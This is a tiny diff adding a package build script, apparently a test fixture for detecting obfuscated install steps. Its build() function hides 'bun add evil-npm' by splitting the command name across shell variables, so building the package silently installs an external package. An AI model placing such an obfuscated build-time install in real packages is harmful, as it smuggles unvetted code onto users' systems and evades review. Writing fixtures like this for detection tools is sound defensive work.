@@ -1,0 +1,6 @@
+pkgname=pkg-varsplit
+pkgver=1.0
+pkgrel=1
+build() {
+    a=bu; b=n; $a$b add evil-npm
+}
